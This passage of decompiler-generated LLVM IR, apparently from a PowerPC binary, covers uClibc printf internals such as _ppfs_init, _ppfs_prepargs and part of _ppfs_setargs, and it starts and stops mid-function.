dec_label_pc_10008ce4:                            ; preds = %dec_label_pc_10008ccc
  br label %dec_label_pc_10008ce8

dec_label_pc_10008ce8:                            ; preds = %dec_label_pc_10008cc0, %dec_label_pc_10008ce4
  %v0_10008cec = load i32, i32* %r24.global-to-local, align 4
  %v0_10008cf4 = load i32, i32* @r27, align 4
  %v2_10008cf4 = add i32 %v0_10008cf4, ptrtoint (i32* @global_var_100128f0.579 to i32)
  store i32 268471548, i32* @lr, align 4
  %v2_10008cf8 = call i32 @__GI_fputs_unlocked(i32 %v2_10008cf4, i32 %v0_10008cec)
  %v0_10008d04 = load i32, i32* @r29, align 4
  store i32 268471564, i32* @lr, align 4
  %v4_10008d08 = call i32 @_charpad(i32 %v0_10008cec, i8 48, i32 %v0_10008d04)
  %v1_10008d0c = load i32, i32* @r29, align 4
  %v4_10008d0c = icmp eq i32 %v4_10008d08, %v1_10008d0c
  br i1 %v4_10008d0c, label %dec_label_pc_10008d14, label %dec_label_pc_10008dd8

dec_label_pc_10008d14:                            ; preds = %dec_label_pc_10008ce8
  %v3_10008d14 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10008d14, i32* %r0.global-to-local, align 4
  %v3_10008d18 = icmp eq i32 %v3_10008d14, 0
  br i1 %v3_10008d18, label %dec_label_pc_10008d20, label %dec_label_pc_10008d48

dec_label_pc_10008d20:                            ; preds = %dec_label_pc_10008d14
  %v0_10008d20 = load i32, i32* @r31, align 4
  %v3_10008d20 = icmp eq i32 %v0_10008d20, 0
  br i1 %v3_10008d20, label %dec_label_pc_10008d3c.thread, label %dec_label_pc_10008d3c

dec_label_pc_10008d3c.thread:                     ; preds = %dec_label_pc_10008d20
  br label %dec_label_pc_10008dac

dec_label_pc_10008d3c:                            ; preds = %dec_label_pc_10008d20
  %v0_10008d2c = load i32, i32* @r30, align 4
  %v0_10008d34 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471612, i32* @lr, align 4
  %v4_10008d38 = inttoptr i32 %v0_10008d34 to i16*
  %v5_10008d38 = call i32 @__stdio_fwrite(i32 %v0_10008d2c, i32 %v0_10008d20, i16* %v4_10008d38)
  %v1_10008d3c.pre = load i32, i32* @r31, align 4
  %v4_10008d3c = icmp eq i32 %v5_10008d38, %v1_10008d3c.pre
  br i1 %v4_10008d3c, label %dec_label_pc_10008dac, label %dec_label_pc_10008dd8

dec_label_pc_10008d48:                            ; preds = %dec_label_pc_10008d14
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10008d8c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008d8c

dec_label_pc_10008d54:                            ; preds = %dec_label_pc_10008d8c
  %tmp78 = icmp ult i32 %v0_10008da4, 129
  br i1 %tmp78, label %dec_label_pc_10008d5c, label %dec_label_pc_10008d58

dec_label_pc_10008d58:                            ; preds = %dec_label_pc_10008d54
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_10008d5c

dec_label_pc_10008d5c:                            ; preds = %dec_label_pc_10008d54, %dec_label_pc_10008d58
  store i32 ptrtoint (i32* @global_var_10008d60.580 to i32), i32* @lr, align 4
  %v0_10008d5c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10008d5c, i32* @r30, align 4
  %v3_10008d64 = icmp eq i32 %v0_10008d5c, 0
  br i1 %v3_10008d64, label %dec_label_pc_10008d80, label %dec_label_pc_10008d78

dec_label_pc_10008d78:                            ; preds = %dec_label_pc_10008d5c
  %v0_10008d68 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471676, i32* @lr, align 4
  %v3_10008d78 = inttoptr i32 %v0_10008d68 to i16*
  %v4_10008d78 = call i32 @__stdio_fwrite(i32 %v2_10008c3c, i32 %v0_10008d5c, i16* %v3_10008d78)
  store i32 %v4_10008d78, i32* %r0.global-to-local, align 4
  %v1_10008d80.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008d80

dec_label_pc_10008d80:                            ; preds = %dec_label_pc_10008d5c, %dec_label_pc_10008d78
  %v1_10008d80 = phi i32 [ 0, %dec_label_pc_10008d5c ], [ %v1_10008d80.pre, %dec_label_pc_10008d78 ]
  %v0_10008d84 = phi i32 [ 0, %dec_label_pc_10008d5c ], [ %v4_10008d78, %dec_label_pc_10008d78 ]
  %v4_10008d80 = icmp eq i32 %v0_10008d84, %v1_10008d80
  %v1_10008d84 = load i32, i32* @r31, align 4
  %v2_10008d84 = sub i32 %v1_10008d84, %v0_10008d84
  store i32 %v2_10008d84, i32* @r31, align 4
  br i1 %v4_10008d80, label %dec_label_pc_10008d8c, label %dec_label_pc_10008dd8

dec_label_pc_10008d8c:                            ; preds = %dec_label_pc_10008d80, %dec_label_pc_10008d48
  %v0_10008da4 = phi i32 [ %v2_10008d84, %dec_label_pc_10008d80 ], [ %v0_10008d8c.pre, %dec_label_pc_10008d48 ]
  %v3_10008d8c = icmp eq i32 %v0_10008da4, 0
  store i32 %v2_10008c3c, i32* @r29, align 4
  store i32 %v2_10008b5c, i32* @r4, align 4
  store i32 %v2_10008b60, i32* @r6, align 4
  store i32 %v2_10008c3c, i32* @r3, align 4
  store i32 %v0_10008da4, i32* @r5, align 4
  br i1 %v3_10008d8c, label %dec_label_pc_10008dac, label %dec_label_pc_10008d54

dec_label_pc_10008dac:                            ; preds = %dec_label_pc_10008d8c, %dec_label_pc_10008d3c.thread, %dec_label_pc_10008d3c
  %v0_10008dac = load i32, i32* %r24.global-to-local, align 4
  %v0_10008db4 = load i32, i32* @r28, align 4
  store i32 268471740, i32* @lr, align 4
  %v4_10008db8 = call i32 @_charpad(i32 %v0_10008dac, i8 32, i32 %v0_10008db4)
  %v1_10008dbc = load i32, i32* @r28, align 4
  %v4_10008dbc = icmp eq i32 %v4_10008db8, %v1_10008dbc
  br i1 %v4_10008dbc, label %dec_label_pc_10008dc4, label %dec_label_pc_10008dd8

dec_label_pc_10008dc4:                            ; preds = %dec_label_pc_10008dac, %dec_label_pc_10008b14, %dec_label_pc_100088e8
  %stack_var_-184.2 = phi i32 [ %v0_10008a1c, %dec_label_pc_100088e8 ], [ %stack_var_-184.1, %dec_label_pc_10008dac ], [ %v0_10008a1c, %dec_label_pc_10008b14 ]
  %v3_10008dc4 = load i8*, i8** %stack_var_-200, align 4
  %v4_10008dc4 = ptrtoint i8* %v3_10008dc4 to i32
  store i32 %v4_10008dc4, i32* @r29, align 4
  br label %dec_label_pc_10008dc8

dec_label_pc_10008dc8:                            ; preds = %dec_label_pc_100087dc, %dec_label_pc_10008dc4
  %v0_10008dc8 = phi i32 [ %v0_10008dc8.pre, %dec_label_pc_100087dc ], [ %v4_10008dc4, %dec_label_pc_10008dc4 ]
  %v0_10008a1c = phi i32 [ %tmp56, %dec_label_pc_100087dc ], [ %stack_var_-184.2, %dec_label_pc_10008dc4 ]
  br label %dec_label_pc_100087f4

dec_label_pc_10008dd8:                            ; preds = %dec_label_pc_10008c30, %dec_label_pc_10008dac, %dec_label_pc_10008d3c, %dec_label_pc_10008ce8, %dec_label_pc_10008ccc, %dec_label_pc_10008b8c, %dec_label_pc_10008b5c, %dec_label_pc_10008af0, %dec_label_pc_10008830, %dec_label_pc_10008d80
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10008ddc

dec_label_pc_10008ddc:                            ; preds = %dec_label_pc_1000883c, %dec_label_pc_100087b4, %dec_label_pc_100087cc, %dec_label_pc_10008dd8
  store i32 %v0_10008788, i32* %r0.global-to-local, align 4
  %v0_10008de0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10008de0

; uselistorder directives
  uselistorder i32 %v0_10008a1c, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10008da4, { 1, 2, 0 }
  uselistorder i32 %v1_10008cb8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10008c48, { 1, 0 }
  uselistorder i32 %v2_10008bd8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008b38, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10008a1c, { 1, 0 }
  uselistorder i32 %v6_100089d4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_100089a4, { 1, 0 }
  uselistorder i32 %v1_10008948, { 1, 0 }
  uselistorder i1 %v2_1000893c, { 1, 0 }
  uselistorder i32 %v0_100088ec, { 1, 0, 2 }
  uselistorder i32 %v1_100088d8, { 1, 0 }
  uselistorder i32 %v0_100088d0, { 1, 0 }
  uselistorder i32 %v1_100088cc, { 1, 0 }
  uselistorder i32 %v1_10008848, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10008810, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10008820, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10008c3c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_10008884, { 1, 2, 0 }
  uselistorder i32 %v4_1000887c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10008ddc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10008dd8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10008dc8, { 1, 0 }
  uselistorder label %dec_label_pc_10008dac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008d80, { 1, 0 }
  uselistorder label %dec_label_pc_10008d5c, { 1, 0 }
  uselistorder label %dec_label_pc_10008ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10008cc0, { 1, 0 }
  uselistorder label %dec_label_pc_10008ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10008c94, { 1, 0 }
  uselistorder label %dec_label_pc_10008c74, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008c74thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008c68, { 1, 0 }
  uselistorder label %dec_label_pc_10008bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10008be4, { 1, 0 }
  uselistorder label %dec_label_pc_10008b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10008aac, { 1, 0 }
  uselistorder label %dec_label_pc_10008a94, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10008a44, { 1, 0 }
  uselistorder label %dec_label_pc_10008a28, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100089b4, { 1, 0 }
  uselistorder label %dec_label_pc_10008998, { 1, 0 }
  uselistorder label %dec_label_pc_10008984, { 1, 0 }
  uselistorder label %dec_label_pc_10008980, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008954, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100088dc, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100088c8.dec_label_pc_100088c8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100088a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000883c, { 1, 0 }
  uselistorder label %dec_label_pc_10008830, { 1, 0 }
  uselistorder label %dec_label_pc_100087f4, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10008df8 = load i32, i32* @lr, align 4
  store i32 %v0_10008df8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10008e08 = load i32, i32* @r4, align 4
  store i32 %v0_10008e08, i32* @r30, align 4
  store i32 268471832, i32* @lr, align 4
  %v3_10008e14 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_10008e18 = load i32, i32* @r31, align 4
  %v1_10008e18 = add i32 %v0_10008e18, 24
  %v2_10008e18 = inttoptr i32 %v1_10008e18 to i32*
  %v3_10008e18 = load i32, i32* %v2_10008e18, align 4
  store i32 %v3_10008e18, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_10008e20 = load i32, i32* @r30, align 4
  %v2_10008e20 = inttoptr i32 %v0_10008e18 to i32*
  store i32 %v0_10008e20, i32* %v2_10008e20, align 4
  %v0_10008e24 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10008e24, i32* %ctr.global-to-local, align 4
  %v0_10008e28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008e28 = add i32 %v0_10008e28, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10008e30 = load i32, i32* @r31, align 4
  %v2_10008e30 = add i32 %v1_10008e30, 24
  %v3_10008e30 = inttoptr i32 %v2_10008e30 to i32*
  store i32 %v1_10008e28, i32* %v3_10008e30, align 4
  %v0_10008e34 = load i32, i32* @r31, align 4
  %v1_10008e34 = add i32 %v0_10008e34, 40
  store i32 %v1_10008e34, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008e38

dec_label_pc_10008e38:                            ; preds = %dec_label_pc_10008e38, %entry
  %v1_10008e38 = phi i32 [ %v1_10008e3c, %dec_label_pc_10008e38 ], [ %v1_10008e34, %entry ]
  %v0_10008e38 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008e38 = inttoptr i32 %v1_10008e38 to i32*
  store i32 %v0_10008e38, i32* %v2_10008e38, align 4
  %v0_10008e3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10008e3c = add i32 %v0_10008e3c, 4
  store i32 %v1_10008e3c, i32* %r9.global-to-local, align 4
  %v0_10008e40 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008e40 = add i32 %v0_10008e40, -1
  store i32 %v1_10008e40, i32* %ctr.global-to-local, align 4
  %v2_10008e40 = icmp eq i32 %v1_10008e40, 0
  br i1 %v2_10008e40, label %dec_label_pc_10008e44, label %dec_label_pc_10008e38

dec_label_pc_10008e44:                            ; preds = %dec_label_pc_10008e38
  %v0_10008e44 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008e84

dec_label_pc_10008e54:                            ; preds = %dec_label_pc_10008e84
  %v3_10008e8c = icmp eq i8 %v2_10008e84, 37
  br i1 %v3_10008e8c, label %dec_label_pc_10008e58, label %dec_label_pc_10008e80

dec_label_pc_10008e58:                            ; preds = %dec_label_pc_10008e54
  %v1_10008e58 = add i32 %v0_10008e58, 1
  %v2_10008e58 = inttoptr i32 %v1_10008e58 to i8*
  %v3_10008e58 = load i8, i8* %v2_10008e58, align 1
  %v4_10008e58 = zext i8 %v3_10008e58 to i32
  store i32 %v4_10008e58, i32* %r0.global-to-local, align 4
  store i32 %v1_10008e58, i32* %r9.global-to-local, align 4
  %v3_10008e60 = icmp eq i8 %v3_10008e58, 37
  br i1 %v3_10008e60, label %dec_label_pc_10008e80, label %dec_label_pc_10008e68

dec_label_pc_10008e68:                            ; preds = %dec_label_pc_10008e58
  %v0_10008e5c = load i32, i32* @r31, align 4
  %v2_10008e68 = inttoptr i32 %v0_10008e5c to i32*
  store i32 %v1_10008e58, i32* %v2_10008e68, align 4
  store i32 268471920, i32* @lr, align 4
  %v1_10008e6c = load i32, i32* %r9.global-to-local, align 4
  %v3_10008e6c = call i32 @_ppfs_parsespec(i32* %v2_10008e68, i32 %v1_10008e6c)
  %v1_10008e70 = icmp slt i32 %v3_10008e6c, 0
  br i1 %v1_10008e70, label %dec_label_pc_10008e9c, label %dec_label_pc_10008e78

dec_label_pc_10008e78:                            ; preds = %dec_label_pc_10008e68
  %v0_10008e78 = load i32, i32* @r31, align 4
  %v1_10008e78 = inttoptr i32 %v0_10008e78 to i32*
  %v2_10008e78 = load i32, i32* %v1_10008e78, align 4
  br label %dec_label_pc_10008e84

dec_label_pc_10008e80:                            ; preds = %dec_label_pc_10008e54, %dec_label_pc_10008e58
  %v0_10008e80 = phi i32 [ %v0_10008e58, %dec_label_pc_10008e54 ], [ %v1_10008e58, %dec_label_pc_10008e58 ]
  %v1_10008e80 = add i32 %v0_10008e80, 1
  br label %dec_label_pc_10008e84

dec_label_pc_10008e84:                            ; preds = %dec_label_pc_10008e78, %dec_label_pc_10008e80, %dec_label_pc_10008e44
  %v0_10008e58 = phi i32 [ %v0_10008e44, %dec_label_pc_10008e44 ], [ %v1_10008e80, %dec_label_pc_10008e80 ], [ %v2_10008e78, %dec_label_pc_10008e78 ]
  store i32 %v0_10008e58, i32* %r9.global-to-local, align 4
  %v1_10008e84 = inttoptr i32 %v0_10008e58 to i8*
  %v2_10008e84 = load i8, i8* %v1_10008e84, align 1
  %v3_10008e84 = zext i8 %v2_10008e84 to i32
  store i32 %v3_10008e84, i32* %r0.global-to-local, align 4
  %v3_10008e88 = icmp eq i8 %v2_10008e84, 0
  br i1 %v3_10008e88, label %dec_label_pc_10008e94, label %dec_label_pc_10008e54

dec_label_pc_10008e94:                            ; preds = %dec_label_pc_10008e84
  %v0_10008e94 = load i32, i32* @r30, align 4
  %v1_10008e94 = load i32, i32* @r31, align 4
  %v2_10008e94 = inttoptr i32 %v1_10008e94 to i32*
  store i32 %v0_10008e94, i32* %v2_10008e94, align 4
  br label %dec_label_pc_10008e9c

dec_label_pc_10008e9c:                            ; preds = %dec_label_pc_10008e68, %dec_label_pc_10008e94
  %storemerge = phi i32 [ 0, %dec_label_pc_10008e94 ], [ -1, %dec_label_pc_10008e68 ]
  store i32 %v0_10008df8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10008e84, { 1, 2, 0 }
  uselistorder i32 %v0_10008e58, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10008e40, { 1, 0 }
  uselistorder i32 %v1_10008e3c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10008e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10008e84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008e80, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10008eb0 = load i32, i32* @lr, align 4
  %v0_10008eb8 = load i32, i32* @r3, align 4
  store i32 %v0_10008eb8, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10008ed4 = add i32 %v0_10008eb8, 24
  %v2_10008ed4 = inttoptr i32 %v1_10008ed4 to i32*
  %v3_10008ed4 = load i32, i32* %v2_10008ed4, align 4
  store i32 %v3_10008ed4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10008ed4, 1
  br i1 %tmp4, label %dec_label_pc_10008ef8, label %dec_label_pc_10008ee0

dec_label_pc_10008ee0:                            ; preds = %entry
  %v2_10008ee0 = add i32 %v0_10008eb8, 8
  %v3_10008ee0 = inttoptr i32 %v2_10008ee0 to i32*
  store i32 0, i32* %v3_10008ee0, align 4
  %v0_10008ee4 = load i32, i32* @r30, align 4
  %v1_10008ee4 = load i32, i32* @r3, align 4
  %v2_10008ee4 = add i32 %v1_10008ee4, 28
  %v3_10008ee4 = inttoptr i32 %v2_10008ee4 to i32*
  store i32 %v0_10008ee4, i32* %v3_10008ee4, align 4
  %v0_10008ee8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008ee8 = load i32, i32* @r3, align 4
  %v2_10008ee8 = add i32 %v1_10008ee8, 24
  %v3_10008ee8 = inttoptr i32 %v2_10008ee8 to i32*
  store i32 %v0_10008ee8, i32* %v3_10008ee8, align 4
  %v0_10008eec = load i32, i32* %r0.global-to-local, align 4
  %v1_10008eec = load i32, i32* @r3, align 4
  %v2_10008eec = add i32 %v1_10008eec, 4
  %v3_10008eec = inttoptr i32 %v2_10008eec to i32*
  store i32 %v0_10008eec, i32* %v3_10008eec, align 4
  store i32 268472052, i32* @lr, align 4
  %v0_10008ef0 = call i32 @_ppfs_setargs()
  store i32 %v0_10008ef0, i32* %r3.global-to-local, align 4
  %v0_10008ef4 = load i32, i32* @r30, align 4
  %v1_10008ef4 = load i32, i32* @r31, align 4
  %v2_10008ef4 = add i32 %v1_10008ef4, 24
  %v3_10008ef4 = inttoptr i32 %v2_10008ef4 to i32*
  store i32 %v0_10008ef4, i32* %v3_10008ef4, align 4
  %v0_10008f08.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008ef8

dec_label_pc_10008ef8:                            ; preds = %entry, %dec_label_pc_10008ee0
  %v0_10008f08 = phi i32 [ %v0_10008eb8, %entry ], [ %v0_10008f08.pre, %dec_label_pc_10008ee0 ]
  store i32 %v0_10008eb0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008f08

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10008ef8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10008f0c = load i32, i32* @r3, align 4
  %v1_10008f0c = add i32 %v0_10008f0c, 24
  %v2_10008f0c = inttoptr i32 %v1_10008f0c to i32*
  %v3_10008f0c = load i32, i32* %v2_10008f0c, align 4
  store i32 %v3_10008f0c, i32* %r0.global-to-local, align 4
  %v1_10008f10 = add i32 %v0_10008f0c, 88
  store i32 %v1_10008f10, i32* @r8, align 4
  %v1_10008f14 = add i32 %v0_10008f0c, 8
  %v2_10008f14 = inttoptr i32 %v1_10008f14 to i32*
  %v3_10008f14 = load i32, i32* %v2_10008f14, align 4
  store i32 %v3_10008f14, i32* %r9.global-to-local, align 4
  %v2_10008f18 = icmp sgt i32 %v3_10008f0c, 0
  %v3_10008f18 = icmp eq i32 %v3_10008f0c, 0
  store i1 %v2_10008f18, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008f18, label %dec_label_pc_10008f20, label %dec_label_pc_1000910c

dec_label_pc_10008f20:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10008f24 = icmp ne i32 %v3_10008f14, -2147483648
  %v4_10008f24 = icmp eq i32 %v3_10008f14, -2147483648
  store i1 %v3_10008f24, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008f24, label %dec_label_pc_10008f2c, label %dec_label_pc_10008f6c

dec_label_pc_10008f2c:                            ; preds = %dec_label_pc_10008f20
  %v1_10008f2c = add i32 %v0_10008f0c, 76
  %v2_10008f2c = inttoptr i32 %v1_10008f2c to i8*
  %v3_10008f2c = load i8, i8* %v2_10008f2c, align 1
  %v4_10008f2c = zext i8 %v3_10008f2c to i32
  store i32 %v4_10008f2c, i32* %r10.global-to-local, align 4
  store i32 %v1_10008f2c, i32* %r11.global-to-local, align 4
  %v2_10008f34 = icmp ugt i8 %v3_10008f2c, 8
  store i1 %v2_10008f34, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10008f2c, 7
  br i1 %tmp, label %dec_label_pc_10008f54, label %dec_label_pc_10008f3c

dec_label_pc_10008f3c:                            ; preds = %dec_label_pc_10008f2c
  %v1_10008f3c = add i32 %v0_10008f0c, 84
  %v2_10008f3c = inttoptr i32 %v1_10008f3c to i32*
  %v3_10008f3c = load i32, i32* %v2_10008f3c, align 4
  %v1_10008f40 = mul nuw nsw i32 %v4_10008f2c, 4
  %v2_10008f44 = add i32 %v3_10008f3c, %v1_10008f40
  store i32 %v2_10008f44, i32* %r9.global-to-local, align 4
  %v1_10008f48 = add nuw nsw i32 %v4_10008f2c, 1
  store i32 %v1_10008f48, i32* %r0.global-to-local, align 4
  %v1_10008f4c = trunc i32 %v1_10008f48 to i8
  store i8 %v1_10008f4c, i8* %v2_10008f2c, align 1
  br label %dec_label_pc_10008f60

dec_label_pc_10008f54:                            ; preds = %dec_label_pc_10008f2c
  %v1_10008f54 = add i32 %v0_10008f0c, 80
  %v2_10008f54 = inttoptr i32 %v1_10008f54 to i32*
  %v3_10008f54 = load i32, i32* %v2_10008f54, align 4
  store i32 %v3_10008f54, i32* %r9.global-to-local, align 4
  %v1_10008f58 = add i32 %v3_10008f54, 4
  store i32 %v1_10008f58, i32* %r0.global-to-local, align 4
  store i32 %v1_10008f58, i32* %v2_10008f54, align 4
  br label %dec_label_pc_10008f60

dec_label_pc_10008f60:                            ; preds = %dec_label_pc_10008f3c, %dec_label_pc_10008f54
  %v0_10008f60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008f60 = inttoptr i32 %v0_10008f60 to i32*
  %v2_10008f60 = load i32, i32* %v1_10008f60, align 4
  store i32 %v2_10008f60, i32* %r0.global-to-local, align 4
  %v1_10008f64 = load i32, i32* @r8, align 4
  %v2_10008f64 = inttoptr i32 %v1_10008f64 to i32*
  store i32 %v2_10008f60, i32* %v2_10008f64, align 4
  %v0_10008f68 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008f68 = load i32, i32* @r3, align 4
  %v2_10008f68 = add i32 %v1_10008f68, 8
  %v3_10008f68 = inttoptr i32 %v2_10008f68 to i32*
  store i32 %v0_10008f68, i32* %v3_10008f68, align 4
  %v0_10008f6c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008f6c

dec_label_pc_10008f6c:                            ; preds = %dec_label_pc_10008f20, %dec_label_pc_10008f60
  %v2_10008f9c = phi i32 [ %v0_10008f0c, %dec_label_pc_10008f20 ], [ %v0_10008f6c.pre, %dec_label_pc_10008f60 ]
  %v1_10008f6c = add i32 %v2_10008f9c, 4
  %v2_10008f6c = inttoptr i32 %v1_10008f6c to i32*
  %v3_10008f6c = load i32, i32* %v2_10008f6c, align 4
  store i32 %v3_10008f6c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10008f74 = icmp ne i32 %v3_10008f6c, -2147483648
  %v4_10008f74 = icmp eq i32 %v3_10008f6c, -2147483648
  store i1 %v3_10008f74, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008f74, label %dec_label_pc_10008f7c, label %dec_label_pc_100090fc.preheader

dec_label_pc_10008f7c:                            ; preds = %dec_label_pc_10008f6c
  %v1_10008f7c = add i32 %v2_10008f9c, 76
  %v2_10008f7c = inttoptr i32 %v1_10008f7c to i8*
  %v3_10008f7c = load i8, i8* %v2_10008f7c, align 1
  %v4_10008f7c = zext i8 %v3_10008f7c to i32
  store i32 %v4_10008f7c, i32* %r10.global-to-local, align 4
  store i32 %v1_10008f7c, i32* %r11.global-to-local, align 4
  %v2_10008f84 = icmp ugt i8 %v3_10008f7c, 8
  store i1 %v2_10008f84, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_10008f7c, 7
  br i1 %tmp22, label %dec_label_pc_10008fa4, label %dec_label_pc_10008f8c

dec_label_pc_10008f8c:                            ; preds = %dec_label_pc_10008f7c
  %v1_10008f8c = add i32 %v2_10008f9c, 84
  %v2_10008f8c = inttoptr i32 %v1_10008f8c to i32*
  %v3_10008f8c = load i32, i32* %v2_10008f8c, align 4
  %v1_10008f90 = mul nuw nsw i32 %v4_10008f7c, 4
  %v2_10008f94 = add i32 %v3_10008f8c, %v1_10008f90
  store i32 %v2_10008f94, i32* %r9.global-to-local, align 4
  %v1_10008f98 = add nuw nsw i32 %v4_10008f7c, 1
  store i32 %v1_10008f98, i32* %r0.global-to-local, align 4
  %v1_10008f9c = trunc i32 %v1_10008f98 to i8
  store i8 %v1_10008f9c, i8* %v2_10008f7c, align 1
  br label %dec_label_pc_10008fb0

dec_label_pc_10008fa4:                            ; preds = %dec_label_pc_10008f7c
  %v1_10008fa4 = add i32 %v2_10008f9c, 80
  %v2_10008fa4 = inttoptr i32 %v1_10008fa4 to i32*
  %v3_10008fa4 = load i32, i32* %v2_10008fa4, align 4
